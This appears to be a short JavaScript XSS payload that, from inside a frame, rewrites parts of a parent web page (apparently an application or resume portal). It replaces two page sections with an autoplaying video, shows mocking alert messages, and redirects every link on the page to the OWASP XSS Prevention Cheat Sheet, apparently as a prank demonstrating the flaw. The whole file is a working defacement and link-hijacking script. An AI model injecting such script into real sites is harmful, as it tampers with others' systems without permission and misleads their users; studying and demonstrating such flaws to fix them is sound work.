const funny =
  '<video preload="auto" loop="" autoplay="" id="content"><source src="https://media.tenor.com/ndmoHqg8xikAAAPo/brian-family-guy.mp4" type="video/mp4"><source src="https://media.tenor.com/ndmoHqg8xikAAAPs/brian-family-guy.webm" type="video/webm"></video>'
const funnyLink =
  "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"

try {
  parent.document.getElementsByClassName(
    "e11-flex-grow e11-overflow-y-auto ng-star-inserted"
  )[0].innerHTML = funny
  alert("Ah hell nah, this application boring af")
} catch (e) {
  //ignore
}
try {
  parent.document.getElementsByClassName(
    "e11-bg-skin-app-bg-dark e11-text-white/70 e11-overflow-hidden e11-rounded nav-prototype"
  )[0].innerHTML = funny
  alert("Ah hell nah, this resume boring af")
} catch (e) {
  //ignore
}
const aaa = parent.document.getElementsByTagName("a")
for (let i = 0; i < aaa.length; i++) {
  aaa[i].href = funnyLink
}
